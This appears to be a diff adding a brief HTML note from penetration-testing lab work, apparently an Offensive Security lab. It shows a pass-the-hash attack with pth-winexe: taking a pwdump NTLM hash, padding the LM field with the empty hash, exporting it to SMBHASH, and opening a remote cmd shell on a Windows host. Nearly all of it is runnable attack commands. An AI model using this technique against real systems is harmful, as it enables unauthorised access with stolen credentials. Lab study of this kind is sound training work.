@@ -1,0 +1,26 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>PTH</title>
+</head><body><b>List PTH tools</b><br/>
+<tt><br/>
+pth- &lt;tab-tab&gt;<br/>
+<br/>
+</tt><b>Use of pth-winexe to get the shell<br/>
+</b><br/>
+Suppose we have following pwdump entry:<br/>
+<tt><br/>
+pepa:500:NO PASSWORD*********************:F0077E09642828EF531A58C66A879462:::<br/>
+</tt><br/>
+Replace LM field with empty LM hash: AAD3B435B51404EEAAD3B435B51404EE<br/>
+<tt><br/>
+</tt><tt>pepa:500:</tt>AAD3B435B51404EEAAD3B435B51404EE<tt>:F0077E09642828EF531A58C66A879462:::<br/>
+</tt><br/>
+Export hash to SMBHASH envar:<br/>
+<br/>
+<tt>export SMBHASH=AAD3B435B51404EEAAD3B435B51404EE:F0077E09642828EF531A58C66A879462<br/>
+</tt><br/>
+Run pth-winexe:<br/>
+<tt><br/>
+pth-winexe -U offsec% //10.11.13.67 cmd<br/>
+</tt></body></html>
